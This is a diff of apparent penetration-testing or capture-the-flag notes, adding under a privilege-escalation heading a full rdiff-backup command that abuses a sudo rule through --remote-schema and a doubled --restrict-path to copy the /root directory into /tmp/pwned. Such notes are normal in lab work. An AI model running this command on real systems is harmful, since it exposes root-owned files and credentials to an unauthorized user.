@@ -77,9 +77,13 @@ PORT 1689(Java RMI)
 
 # PRIV ESCLATION
 
+```bash
+rdiff-backup --remote-schema \
+'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
+backup /::/root /tmp/pwned 
+
 ```
-rdiff-backup 
-```
+
 
 
 
